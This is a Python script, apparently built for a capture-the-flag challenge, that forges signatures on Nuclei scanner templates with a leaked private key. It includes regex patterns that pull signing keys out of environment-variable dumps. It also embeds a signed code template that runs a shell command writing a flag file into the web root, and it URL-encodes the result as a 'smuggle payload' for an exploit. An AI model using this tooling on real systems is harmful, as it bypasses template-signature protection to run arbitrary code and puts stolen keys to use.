#!/usr/bin/env python3
"""
Nuclei Template Signer

If you can leak the private key, use this to sign your templates.
Also includes key extraction from various sources.

Nuclei signature format:
# digest: <hex(0x490a + DER_encoded_signature)>:<md5(public_key)>
"""

import hashlib
import os
import sys
import re

try:
    from ecdsa import SigningKey, NIST256p
    from ecdsa.util import sigencode_der
    ECDSA_AVAILABLE = True
except ImportError:
    ECDSA_AVAILABLE = False
    print("[!] ecdsa library not available. Install with: pip install ecdsa")


def compute_template_hash(template_content: str) -> bytes:
    """
    Compute the hash of template content for signing.
    The hash is computed on the template WITHOUT the digest line.
    """
    # Remove existing digest line if present
    lines = template_content.split('\n')
    filtered_lines = [l for l in lines if not l.strip().startswith('# digest:')]
    clean_content = '\n'.join(filtered_lines)
    
    # Nuclei uses SHA-256 for template hashing
    return hashlib.sha256(clean_content.encode('utf-8')).digest()


def sign_template(template_content: str, private_key_pem: str) -> str:
    """
    Sign a nuclei template with the given private key.
    Returns the template with the digest line appended.
    """
    if not ECDSA_AVAILABLE:
        raise ImportError("ecdsa library required for signing")
    
    # Load the private key
    sk = SigningKey.from_pem(private_key_pem)
    
    # Get the public key for the hash
    vk = sk.get_verifying_key()
    public_key_bytes = vk.to_string()
    public_key_hash = hashlib.md5(public_key_bytes).hexdigest()
    
    # Compute template hash
    template_hash = compute_template_hash(template_content)
    
    # Sign with ECDSA
    signature = sk.sign(template_hash, sigencode=sigencode_der)
    
    # Format: 0x490a prefix + DER signature
    # 490a is the nuclei signature version identifier
    signature_hex = "490a" + signature.hex()
    
    # Build the digest line
    digest_line = f"# digest: {signature_hex}:{public_key_hash}"
    
    # Append to template
    result = template_content.rstrip() + "\n" + digest_line
    
    return result


def extract_key_from_env(env_content: str) -> str:
    """Try to extract nuclei signing key from environment variables dump"""
    patterns = [
        r'NUCLEI_SIGNATURE_PRIVATE_KEY=([^\s]+)',
        r'NUCLEI_KEY=([^\s]+)',
        r'PRIVATE_KEY=([^\s]+)',
    ]
    
    for pattern in patterns:
        match = re.search(pattern, env_content)
        if match:
            key_data = match.group(1)
            # Might be base64 encoded
            try:
                import base64
                decoded = base64.b64decode(key_data).decode()
                if "PRIVATE KEY" in decoded:
                    return decoded
            except:
                pass
            return key_data
    
    return None


def generate_key_pair():
    """Generate a new ECDSA key pair for testing"""
    if not ECDSA_AVAILABLE:
        raise ImportError("ecdsa library required")
    
    sk = SigningKey.generate(curve=NIST256p)
    vk = sk.get_verifying_key()
    
    return sk.to_pem().decode(), vk.to_pem().decode()


def get_getflag_template():
    """Return the getflag template for signing"""
    return """id: getflag
info:
  name: getflag
  author: x
  severity: high
code:
  - engine:
      - sh
    source: |
      /readflag > /var/www/html/f.txt
"""


def main():
    if len(sys.argv) < 2:
        print("""
Usage:
    python3 nuclei_signer.py sign <template_file> <private_key_file>
    python3 nuclei_signer.py generate-key
    python3 nuclei_signer.py extract-env <env_dump_file>
    python3 nuclei_signer.py test-sign <private_key_file>
        """)
        return
    
    command = sys.argv[1]
    
    if command == "sign":
        if len(sys.argv) < 4:
            print("Usage: sign <template_file> <private_key_file>")
            return
        
        with open(sys.argv[2]) as f:
            template = f.read()
        with open(sys.argv[3]) as f:
            key = f.read()
        
        signed = sign_template(template, key)
        print(signed)
        
    elif command == "generate-key":
        private_key, public_key = generate_key_pair()
        print("=== Private Key ===")
        print(private_key)
        print("\n=== Public Key ===")
        print(public_key)
        
        # Save to files
        with open("private-key.pem", "w") as f:
            f.write(private_key)
        with open("public-key.pem", "w") as f:
            f.write(public_key)
        print("\n[+] Keys saved to private-key.pem and public-key.pem")
        
    elif command == "extract-env":
        if len(sys.argv) < 3:
            print("Usage: extract-env <env_dump_file>")
            return
        
        with open(sys.argv[2]) as f:
            env_content = f.read()
        
        key = extract_key_from_env(env_content)
        if key:
            print(f"[+] Found key:\n{key}")
        else:
            print("[-] No key found in environment dump")
            
    elif command == "test-sign":
        if len(sys.argv) < 3:
            print("Usage: test-sign <private_key_file>")
            return
        
        with open(sys.argv[2]) as f:
            key = f.read()
        
        template = get_getflag_template()
        signed = sign_template(template, key)
        
        print("[+] Signed template:")
        print(signed)
        
        # URL encode for use in exploit
        import urllib.parse
        print("\n[+] URL encoded for smuggle payload:")
        print(urllib.parse.quote(signed))
        
    else:
        print(f"Unknown command: {command}")


if __name__ == "__main__":
    main()
